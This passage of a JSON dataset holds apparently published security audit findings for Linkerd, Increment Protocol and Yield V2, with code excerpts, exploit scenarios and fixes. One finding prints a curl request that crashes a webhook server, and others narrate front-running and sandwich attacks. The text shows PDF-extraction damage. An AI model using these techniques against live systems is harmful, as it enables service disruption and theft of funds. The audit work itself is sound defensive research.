printed and tricking an operator into falsely believing there is a failure. Recommendations Short term, ensure that all user-controlled input is sanitized before it is used in the logging function. Additionally, use the format specier %q instead of %s to prompt Go to perform basic sanitation of strings.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. TLS conguration does not enforce minimum TLS version ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "Transport Layer Security (TLS) is used in multiple locations throughout the codebase. In two cases, TLS congurations do not have a minimum version requirement, allowing connections from TLS 1.0 and later. This may leave the webhook and TAP API servers vulnerable to protocol downgrade and man-in-the-middle attacks. // NewServer returns a new instance of Server func NewServer( ctx context.Context, api *k8s.API, addr, certPath string, handler Handler, component string, ) (*Server, error) { [...] server := &http.Server{ Addr: addr, TLSConfig: &tls.Config{}, } Figure 8.1: controller/webhook/server.go#L43-L64 // NewServer creates a new server that implements the Tap APIService. func NewServer( ctx context.Context, addr string, k8sAPI *k8s.API, grpcTapServer pb.TapServer, disableCommonNames bool, ) (*Server, error) { [...] httpServer := &http.Server{ Addr: addr, TLSConfig: &tls.Config{ ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: clientCertPool, }, } Figure 8.2: viz/tap/api/sever.go#L34-L76 Exploit Scenario Due to the lack of minimum TLS version enforcement, certain established connections lack sucient authentication and cryptography. These connections do not protect against man-in-the-middle attacks. Recommendations Short term, review all TLS congurations and ensure the MinVersion eld is set to require connections to be TLS 1.2 or newer. Long term, ensure that all TLS congurations across the codebase enforce a minimum version requirement and employ verication where possible.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Nil dereferences in the webhook server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The webhook servers processReq function, used for handling admission review requests, does not properly validate request objects. As a result, malformed requests result in nil dereferences, which cause panics on the server. If the server receives a request with a body that cannot be decoded by the decode function, shown below, an error is returned, and a panic is triggered when the system attempts to access the Request object in line 154. A panic could also occur if the request is decoded successfully into an AdmissionReview object with a missing Request property. In such a case, the panic would be triggered in line 162. 149 func (s *Server) processReq(ctx context.Context, data []byte) *admissionv1beta1.AdmissionReview { 150 151 152 153 154 155 156 157 158 159 160 161 162 admissionReview, err := decode(data) if err != nil { log.Errorf(\"failed to decode data. Reason: %s\", err) admissionReview.Response = &admissionv1beta1.AdmissionResponse{ admissionReview.Request.UID, UID: Allowed: false, Result: &metav1.Status{ Message: err.Error(), }, } return admissionReview } log.Infof(\"received admission review request %s\", admissionReview.Request.UID) 163 log.Debugf(\"admission request: %+v\", admissionReview.Request) Figure 9.1: controller/webhook/server.go#L149-L163 We tested the panic by getting a shell on a container running in the application namespace and issuing the request in gure 9.2. However, the Go server recovers from the panics without negatively impacting the application. curl -i -s -k -X $'POST' -H $'Host: 10.100.137.130:443' -H $'Accept: */*' -H $'Content-Length: 6' --data-binary $'aaaaaa' $'https://10.100.137.130:443/inject/test Figure 9.2: The curl request that causes a panic Recommendations Short term, add checks to verify that request objects are not nil before and after they are decoded. Long term, run the invalid-usage-of-modified-variable rule from the set of Semgrep rules in the CI/CD pipeline to detect this type of bug. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Governance role is a single point of failure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Because the governance role is centralized and responsible for critical functionalities, it constitutes a single point of failure within the Increment Protocol. The role can perform the following privileged operations:        Whitelisting a perpetual market Setting economic parameters Updating price oracle addresses and setting xed prices for assets Managing protocol insurance funds Updating the addresses of core contracts Adding support for new reserve tokens to the UA contract Pausing and unpausing protocol operations These privileges give governance complete control over the protocol and therefore access to user and protocol funds. This increases the likelihood that the governance account will be targeted by an attacker and incentivizes governance to act maliciously. Note, though, that the governance role is currently controlled by a multisignature wallet (a multisig) and that control may be transferred to a decentralized autonomous organization (DAO) in the future. Exploit Scenario Eve, an attacker, creates a fake token, compromises the governance account, and adds the fake token as a reserve token for UA. She mints UA by making a deposit of the fake token and then burns the newly acquired UA tokens, which enables her to withdraw all USDC from the reserves. Recommendations Short term, minimize the privileges of the governance role and update the documentation to include the implications of those privileges . Additionally, implement reasonable time delays for privileged operations. Long term, document an incident response plan and ensure that the private keys for the multisig are managed safely. Additionally, carefully evaluate the risks of moving from a multisig to a DAO and consider whether the move is necessary.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Inconsistent lower bounds on collateral weights ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The lower bound on a collateral assets initial weight (when the collateral is rst whitelisted) is dierent from that enforced if the weight is updated; this discrepancy increases the likelihood of collateral seizures by liquidators. A collateral assets weight represents the level of risk associated with accepting that asset as collateral. This risk calculation comes into play when the protocol is assessing whether a liquidator can seize a users non-UA collateral. To determine the value of each collateral asset, the protocol multiplies the users balance of that asset by the collateral weight (a percentage). A riskier asset will have a lower weight and thus a lower value. If the total value of a users non-UA collateral is less than the users UA debt, a liquidator can seize the collateral. When whitelisting a collateral asset, the Perpetual.addWhiteListedCollateral function requires the collateral weight to be between 10% and 100% (gure 2.1). According to the documentation, these are the correct bounds for a collateral assets weight. function addWhiteListedCollateral ( IERC20Metadata asset, uint256 weight , uint256 maxAmount ) public override onlyRole(GOVERNANCE) { if (weight < 1e17) revert Vault_InsufficientCollateralWeight(); if (weight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.1: A snippet of the addWhiteListedCollateral function in Vault.sol#L224-230 However, governance can choose to update that weight via a call to Perpetual.changeCollateralWeight , which allows the weight to be between 1% and 100% (gure 2.2). function changeCollateralWeight (IERC20Metadata asset, uint256 newWeight ) external override onlyRole(GOVERNANCE) { uint256 tokenIdx = tokenToCollateralIdx[asset]; if (!((tokenIdx != 0 ) || ( address (asset) == address (UA)))) revert Vault_UnsupportedCollateral(); if (newWeight < 1e16) revert Vault_InsufficientCollateralWeight(); if (newWeight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.2: A snippet of the changeCollateralWeight function in Vault.sol#L254-259 If the weight of a collateral asset were mistakenly set to less than 10%, the value of that collateral would decrease, thereby increasing the likelihood of seizures of non-UA collateral. Exploit Scenario Alice, who holds the governance role, decides to update the weight of a collateral asset in response to volatile market conditions. By mistake, Alice sets the weight of the collateral to 1% instead of 10%. As a result of this change, Bobs non-UA collateral assets decrease in value and are seized. Recommendations Short term, change the lower bound on newWeight in the changeCollateralWeight function from 1e16 to 1e17 . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "3. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The Increment Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Increment Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Support for multiple reserve tokens allows for arbitrage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Because the UA token contract supports multiple reserve tokens, it can be used to swap one reserve token for another at a ratio of 1:1. This creates an arbitrage opportunity, as it enables users to swap reserve tokens with dierent prices. Users can deposit supported reserve tokens in the UA contract in exchange for UA tokens at a 1:1 ratio (gure 4.1). function mintWithReserve ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); ReserveToken memory reserveToken = reserveTokens[tokenIdx]; // Check that the cap of the reserve token isn't reached uint256 wadAmount = LibReserve.tokenToWad(reserveToken.asset.decimals(), amount); if (reserveToken.currentReserves + wadAmount > reserveToken.mintCap) revert UA_ExcessiveTokenMintCapReached(); _mint( msg.sender , wadAmount); reserveTokens[tokenIdx].currentReserves += wadAmount; reserveToken.asset.safeTransferFrom( msg.sender , address ( this ), amount); } Figure 4.1: The mintWithReserve function in UA.sol#L38-51 Similarly, users can withdraw the amount of a deposit by returning their UA in exchange for any supported reserve token, also at a 1:1 ratio (gure 4.2). function withdraw ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); IERC20Metadata reserveTokenAsset = reserveTokens[tokenIdx].asset; _burn( msg.sender , amount); reserveTokens[tokenIdx].currentReserves -= amount; uint256 tokenAmount = LibReserve.wadToToken(reserveTokenAsset.decimals(), amount); reserveTokenAsset.safeTransfer( msg.sender , tokenAmount); } Figure 4.2: The withdraw function in UA.sol#L56-66 Thus, a user could mint UA by depositing a less valuable reserve token and then withdraw the same amount of a more valuable token in one transaction, engaging in arbitrage. Exploit Scenario Alice, who holds the governance role, adds USDC and DAI as reserve tokens. Eve notices that DAI is trading at USD 0.99, while USDC is trading at USD 1.00. Thus, she decides to mint a large amount of UA by depositing DAI and to subsequently return the DAI and withdraw USDC, allowing her to make a risk-free prot. Recommendations Short term, document all front-running and arbitrage opportunities in the protocol to ensure that users are aware of them. As development continues, reassess the risks associated with those opportunities and evaluate whether they could adversely aect the protocol . Long term, implement an o-chain monitoring solution (like that detailed in TOB-INC-13 ) to detect any anomalous uctuations in the prices of supported reserve tokens. Additionally, develop an incident response plan to ensure that any issues that arise can be addressed promptly and without confusion. (See appendix D for additional details on creating an incident response plan.)", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Ownership transfers can be front-run ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The PerpOwnable contract provides an access control mechanism for the minting and burning of a Perpetual contracts vBase or vQuote tokens. The owner of these token contracts is set via the transferPerpOwner function, which assigns the owners address to the perp state variable. This function is designed to be called only once, during deployment, to set the Perpetual contract as the owner of the tokens. Then, as the tokens owner, the Perpetual contract can mint / burn tokens during liquidity provisions, trades, and liquidations. However, because the function is external, anyone can call it to set his or her own malicious address as perp , taking ownership of a contracts vBase or vQuote tokens. function transferPerpOwner ( address recipient ) external { if (recipient == address ( 0 )) revert PerpOwnable_TransferZeroAddress(); if (perp != address ( 0 )) revert PerpOwnable_OwnershipAlreadyClaimed(); perp = recipient; emit PerpOwnerTransferred( msg.sender , recipient); } Figure 5.1: The transferPerpOwner function in PerpOwnable.sol#L29-L35 If the call were front-run, the Perpetual contract would not own the vBase or vQuote tokens, and any attempts to mint / burn tokens would revert. Since all user interactions require the minting or burning of tokens, no liquidity provisions, trades, or liquidations would be possible; the market would be eectively unusable. An attacker could launch such an attack upon every perpetual market deployment to cause a denial of service (DoS). Exploit Scenario Alice, an admin of the Increment Protocol, deploys a new Perpetual contract. Alice then attempts to call transferPerpOwner to set perp to the address of the deployed contract. However, Eve, an attacker monitoring the mempool, sees Alices call to transferPerpOwner and calls the function with a higher gas price. As a result, Eve gains ownership of the virtual tokens and renders the perpetual market useless. Eve then repeats the process with each subsequent deployment of a perpetual market, executing a DoS attack. Recommendations Short term, move all functionality from the PerpOwnable contract to the Perpetual contract. Then add the hasRole modier to the transferPerpOwner function so that the function can be called only by the manager or governance role. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. Funding payments are made in the wrong token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The funding payments owed to users are made in vBase instead of UA tokens; this results in incorrect calculations of users prot-and-loss (PnL) values, an increased risk of liquidations, and a delay in the convergence of a Perpetual contracts value with that of the underlying base asset. When the protocol executes a trade or liquidity provision, one of its rst steps is settling the funding payments that are due to the calling user. To do that, it calls the _settleUserFundingPayments function in the ClearingHouse contract (gure 6.1). The function sums the funding payments due to the user (as a trader and / or a liquidity provider) across all perpetual markets. Once the function has determined the nal funding payment due to the user ( fundingPayments ), the Vault contracts settlePnL function changes the UA balance of the user. function _settleUserFundingPayments( address account) internal { int256 fundingPayments; uint256 numMarkets = getNumMarkets(); for ( uint256 i = 0 ; i < numMarkets; ) { fundingPayments += perpetuals[i].settleTrader(account) + perpetuals[i].settleLp(account); unchecked { ++i; } } if (fundingPayments != 0 ) { vault.settlePnL(account, fundingPayments); } } Figure 6.1: The _settleUserFundingPayments function in ClearingHouse.sol#L637- Both the Perpetual.settleTrader and Perpetual.settleLp functions internally call _getFundingPayments to calculate the funding payment due to the user for a given market (gure 6.2). function _getFundingPayments( bool isLong, int256 userCumFundingRate, int256 globalCumFundingRate, int256 vBaseAmountToSettle ) internal pure returns ( int256 upcomingFundingPayment) { [...] if (userCumFundingRate != globalCumFundingRate) { int256 upcomingFundingRate = isLong ? userCumFundingRate - globalCumFundingRate : globalCumFundingRate - userCumFundingRate; // fundingPayments = fundingRate * vBaseAmountToSettle upcomingFundingPayment = upcomingFundingRate.wadMul(vBaseAmountToSettle); } } Figure 6.2: The _getFundingPayments function in Perpetual.sol#L1152-1173 However, the upcomingFundingPayment value is expressed in vBase, since it is the product of a percentage, which is unitless, and a vBase token amount, vBaseAmountToSettle . Thus, the fundingPayments value that is calculated in _settleUserFundingPayments is also expressed in vBase. However, the settlePnL function internally updates the users balance of UA, not vBase. As a result, the users UA balance will be incorrect, since the users prot or loss may be signicantly higher or lower than it should be. This discrepancy is a function of the price dierence between the vBase and UA tokens. The use of vBase tokens for funding payments causes three issues. First, when withdrawing UA tokens, the user may lose or gain much more than expected. Second, since the UA balance aects the users collateral reserve total, the balance update may increase or decrease the users risk of liquidation. Finally, since funding payments are not made in the notional asset, the convergence between the mark and index prices may be delayed. Exploit Scenario The BTC / USD perpetual markets mark price is signicantly higher than the index price. Alice, who holds a short position, decides to exit the market. However, the protocol calculates her funding payments in BTC and does not convert them to their UA equivalents before updating her balance. Thus, Alice makes much less than expected. Recommendations Short term, use the vBase.indexPrice() function to convert vBase token amounts to UA before the call to vault.settlePnL . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Excessive dust collection may lead to premature closures of long positions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The upper bound on the amount of funds considered dust by the protocol may lead to the premature closure of long positions. The protocol collects dust to encourage complete closures instead of closures that leave a position with a small balance of vBase. One place that dust collection occurs is the Perpetual contracts _reducePositionOnMarket function (gure 7.1). function _reducePositionOnMarket ( LibPerpetual.TraderPosition memory user, bool isLong , uint256 proposedAmount , uint256 minAmount ) internal returns ( int256 baseProceeds , int256 quoteProceeds , int256 addedOpenNotional , int256 pnl ) { int256 positionSize = int256 (user.positionSize); uint256 bought ; uint256 feePer ; if (isLong) { quoteProceeds = -(proposedAmount.toInt256()); (bought, feePer) = _quoteForBase(proposedAmount, minAmount); baseProceeds = bought.toInt256(); } else { (bought, feePer) = _baseForQuote(proposedAmount, minAmount); quoteProceeds = bought.toInt256(); baseProceeds = -(proposedAmount.toInt256()); } int256 netPositionSize = baseProceeds + positionSize; if (netPositionSize > 0 && netPositionSize <= 1e17) { _donate(netPositionSize.toUint256()); baseProceeds -= netPositionSize; } [...] } Figure 7.1: The _reducePositionOnMarket function in Perpetual.sol#L876-921 If netPositionSize , which represents a users position after its reduction, is between 0 and 1e17 (1/10 of an 18-decimal token), the system will treat the position as closed and donate the dust to the insurance protocol. This will occur regardless of whether the user intended to reduce, rather than fully close, the position. (Note that netPositionSize is positive if the overall position is long. The dust collection mechanism used for short positions is discussed in TOB-INC-11 .) However, if netPositionSize is tracking a high-value token, the donation to Insurance will no longer be insignicant; 1/10 of 1 vBTC, for instance, would be worth ~USD 2,000 (at the time of writing). Thus, the donation of a users vBTC dust (and the resultant closure of the vBTC position) could prevent the user from proting o of a ~USD 2,000 position. Exploit Scenario Alice, who holds a long position in the vBTC / vUSD market, decides to close most of her position. After the swap, netPositionSize is slightly less than 1e17. Since a leftover balance of that amount is considered dust (unbeknownst to Alice), her ~1e17 vBTC tokens are sent to the Insurance contract, and her position is fully closed. Recommendations Short term, have the protocol calculate the notional value of netPositionSize by multiplying it by the return value of the indexPrice function. Then have it compare that notional value to the dust thresholds. Note that the dust thresholds must also be expressed in the notional token and that the comparison should not lead to a signicant decrease in a users position. Long term, document this system edge case to inform users that a fraction of their long positions may be donated to the Insurance contract after being reduced.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "8. Problematic use of primitive operations on xed-point integers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The protocols use of primitive operations over xed-point signed and unsigned integers increases the risk of overows and undened behavior. The Increment Protocol uses the PRBMathSD59x18 and PRBMathUD60x18 math libraries to perform operations over 59x18 signed integers and 60x18 unsigned integers, respectively (specically to perform multiplication and division and to nd their absolute values). These libraries aid in calculations that involve percentages or ratios or require decimal precision. When a smart contract system relies on primitive integers and xed-point ones, it should avoid arithmetic operations that involve the use of both types. For example, using x.wadMul(y) to multiply two xed-point integers will provide a dierent result than using x * y . For that reason, great care must be taken to dierentiate between variables that are xed-point and those that are not. Calculations involving xed-point values should use the provided library operations; calculations involving both xed-point and primitive integers should be avoided unless one type is converted to the other. However, a number of multiplication and division operations in the codebase use both primitive and xed-point integers. These include those used to calculate the new time-weighted average prices (TWAPs) of index and market prices (gure 8.1). function _updateTwap () internal { uint256 currentTime = block.timestamp ; int256 timeElapsed = (currentTime - globalPosition.timeOfLastTrade).toInt256(); /* */ priceCumulative1 = priceCumulative0 + price1 * timeElapsed // will overflow in ~3000 years // update cumulative chainlink price feed int256 latestChainlinkPrice = indexPrice(); oracleCumulativeAmount += latestChainlinkPrice * timeElapsed ; // update cumulative market price feed int256 latestMarketPrice = marketPrice().toInt256(); marketCumulativeAmount += latestMarketPrice * timeElapsed ; uint256 timeElapsedSinceBeginningOfPeriod = block.timestamp - globalPosition.timeOfLastTwapUpdate; if (timeElapsedSinceBeginningOfPeriod >= twapFrequency) { /* */ TWAP = (priceCumulative1 - priceCumulative0) / timeElapsed // calculate chainlink twap oracleTwap = ((oracleCumulativeAmount - oracleCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // calculate market twap marketTwap = ((marketCumulativeAmount - marketCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // reset cumulative amount and timestamp oracleCumulativeAmountAtBeginningOfPeriod = oracleCumulativeAmount; marketCumulativeAmountAtBeginningOfPeriod = marketCumulativeAmount; globalPosition.timeOfLastTwapUpdate = block.timestamp .toUint64(); emit TwapUpdated(oracleTwap, marketTwap); } } Figure 8.1: The _updateTwap function in Perpetual.sol#L1071-1110 Similarly, the _getUnrealizedPnL function in the Perpetual contract calculates the tradingFees value by multiplying a primitive and a xed-point integer (gure 8.2). function _getUnrealizedPnL(LibPerpetual.TraderPosition memory trader) internal view returns ( int256 ) { int256 oraclePrice = indexPrice(); int256 vQuoteVirtualProceeds = int256 (trader.positionSize).wadMul(oraclePrice); int256 tradingFees = (vQuoteVirtualProceeds.abs() * market.out_fee().toInt256()) / CURVE_TRADING_FEE_PRECISION; // @dev: take upper bound on the trading fees // in the case of a LONG, trader.openNotional is negative but vQuoteVirtualProceeds is positive // in the case of a SHORT, trader.openNotional is positive while vQuoteVirtualProceeds is negative return int256 (trader.openNotional) + vQuoteVirtualProceeds - tradingFees; } Figure 8.2: The _getUnrealizedPnL function in Perpetual.sol#L1175-1183 These calculations can lead to unexpected overows or cause the system to enter an undened state. Note that there are other such calculations in the codebase that are not documented in this nding. Recommendations Short term, identify all state variables that are xed-point signed or unsigned integers. Additionally, ensure that all multiplication and division operations involving those state variables use the wadMul and wadDiv functions, respectively. If the Increment Finance team decides against using wadMul or wadDiv in any of those operations (whether to optimize gas or for another reason), it should provide inline documentation explaining that decision.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Liquidations are vulnerable to sandwich attacks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Token swaps that are performed to liquidate a position use a hard-coded zero as the minimum-amount-out value, making them vulnerable to sandwich attacks. The minimum-amount-out value indicates the minimum amount of tokens that a user will receive from a swap. The value is meant to provide protection against pool illiquidity and sandwich attacks. Senders of position and liquidity provision updates are allowed to specify a minimum amount out. However, the minimum-amount-out value used in liquidations of both traders and liquidity providers positions is hard-coded to zero. Figures 9.1 and 9.2 show the functions that perform these liquidations ( _liquidateTrader and _liquidateLp , respectively). function _liquidateTrader( uint256 idx, address liquidatee, uint256 proposedAmount ) internal returns ( int256 pnL, int256 positiveOpenNotional) { (positiveOpenNotional) = int256 (_getTraderPosition(idx, liquidatee).openNotional).abs(); LibPerpetual.Side closeDirection = _getTraderPosition(idx, liquidatee).positionSize >= 0 ? LibPerpetual.Side.Short : LibPerpetual.Side.Long; // (liquidatee, proposedAmount) (, , pnL, ) = perpetuals[idx].changePosition(liquidatee, proposedAmount, 0 , closeDirection, true ); // traders are allowed to reduce their positions partially, but liquidators have to close positions in full if (perpetuals[idx].isTraderPositionOpen(liquidatee)) revert ClearingHouse_LiquidateInsufficientProposedAmount(); return (pnL, positiveOpenNotional); } Figure 9.1: The _liquidateTrader function in ClearingHouse.sol#L522-541 function _liquidateLp ( uint256 idx , address liquidatee , uint256 proposedAmount ) internal returns ( int256 pnL , int256 positiveOpenNotional ) { positiveOpenNotional = _getLpOpenNotional(idx, liquidatee).abs(); // close lp (pnL, , ) = perpetuals[idx].removeLiquidity( liquidatee, _getLpLiquidity(idx, liquidatee), [ uint256 ( 0 ), uint256 ( 0 )] , proposedAmount, 0 , true ); _distributeLpRewards(idx, liquidatee); return (pnL, positiveOpenNotional); } Figure 9.2: The _liquidateLp function in ClearingHouse.sol#L543-562 Without the ability to set a minimum amount out, liquidators are not guaranteed to receive any tokens from the pool during a swap. If a liquidator does not receive the correct amount of tokens, he or she will be unable to close the position, and the transaction will revert; the revert will also prolong the Increment Protocols exposure to debt. Moreover, liquidators will be discouraged from participating in liquidations if they know that they may be subject to sandwich attacks and may lose money in the process. Exploit Scenario Alice, a liquidator, notices that a position is no longer valid and decides to liquidate it. When she sends the transaction, the protocol sets the minimum-amount-out value to zero. Eves sandwich bot identies Alices liquidation as a pure prot opportunity and sandwiches it with transactions. Alices liquidation fails, and the protocol remains in a state of debt. Recommendations Short term, allow liquidators to specify a minimum-amount-out value when liquidating the positions of traders and liquidity providers. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "10. Accuracy of market and oracle TWAPs is tied to the frequency of user interactions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The oracle and market TWAPs can be updated only during traders and liquidity providers interactions with the protocol; a downtick in user interactions will result in less accurate TWAPs that are more susceptible to manipulation. The accuracy of a TWAP is related to the number of data points available for the average price calculation. The less often prices are logged, the less robust the TWAP becomes. In the case of the Increment Protocol, a TWAP can be updated with each block that contains a trader or liquidity provider interaction. However, during a market slump (i.e., a time of reduced network trac), there will be fewer user interactions and thus fewer price updates. TWAP updates are performed by the Perpetual._updateTwap function, which is called by the internal Perpetual._updateGlobalState function. Other protocols, though, take a dierent approach to keeping markets up to date. The Compound Protocol, for example, has an accrueInterest function that is called upon every user interaction but is also a standalone public function that anyone can call. Recommendations Short term, create a public updateGlobalState function that anyone can call to internally call _updateGlobalState . Long term, create an o-chain worker that can alert the team to periods of perpetual market inactivity, ensuring that the team knows to update the market accordingly. 11. Liquidations of short positions may fail because of insu\u0000cient dust collection Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-INC-11 Target: contracts/Perpetual.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Although dependency scans did not identify a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repository under review. The output below details the high-severity vulnerabilities: CVE ID", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. Risks associated with oracle outages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Increment Protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA / USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundID . Thus, the Increment Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. The monitoring solution should check for the following conditions and issue alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset References    Chainlink: Risk Mitigation Chainlink: Monitoring Data Feeds Chainlink: Circuit Breakers", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Lack of contract existence check on delegatecall may lead to unexpected behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Ladle contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The Ladle contract implements the batch and moduleCall functions; users invoke the former to execute batched calls within a single transaction and the latter to make a call to an external module. Neither function performs a contract existence check prior to executing a delegatecall. Figure 1.1 shows the moduleCall function. /// @dev Allow users to use functionality coded in a module, to be used with batch /// @notice Modules must not do any changes to the vault (owner, seriesId, ilkId), /// it would be disastrous in combination with batch vault caching function moduleCall(address module, bytes calldata data) external payable returns (bytes memory result) { } require (modules[module], \"Unregistered module\"); bool success; (success, result) = module.delegatecall(data); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); Figure 1.1: vault-v2/contracts/Ladle.sol#L186-L197 An external modules address must be registered by an administrator before the function calls that module. /// @dev Add or remove a module. function addModule(address module, bool set) external 15 Yield V2 auth modules[module] = set; emit ModuleAdded(module, set); { } Figure 1.2: vault-v2/contracts/Ladle.sol#L143-L150 If the administrator sets the module to an incorrect address or to the address of a contract that is subsequently destroyed, a delegatecall to it will still return success. This means that if one call in a batch does not execute any code, it will still appear to have been successful, rather than causing the entire batch to fail. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Alice, a privileged member of the Yield team, accidentally sets a module to an incorrect address. Bob, a user, invokes the moduleCall method to execute a batch of calls. Despite Alices mistake, the delegatecall returns success without making any state changes or executing any code. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that using suicide or selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. 16 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Use of delegatecall in a payable function inside a loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Ladle contract uses the delegatecall proxy pattern (which takes user-provided call data) in a payable function within a loop. This means that each delegatecall within the for loop will retain the msg.value of the transaction: /// @dev Allows batched call to self (this contract). /// @param calls An array of inputs for each call. function batch(bytes[] calldata calls) external payable returns(bytes[] memory results) { results = new bytes[](calls.length); for (uint256 i; i < calls.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); results[i] = result; } // build would have populated the cache, this deletes it cachedVaultId = bytes12(0); } Figure 2.1: vault-v2/contracts/Ladle.sol#L186-L197 The protocol does not currently use the msg.value in any meaningful way. However, if a future version or refactor of the core protocol introduced a more meaningful use of it, it could be exploited to tamper with the system arithmetic. Exploit Scenario Alice, a member of the Yield team, adds a new functionality to the core protocol that adjusts users balances according to the msg.value. Eve, an attacker, uses the batching functionality to increase her ETH balance without actually sending funds from her account, thereby stealing funds from the system. 17 Yield V2 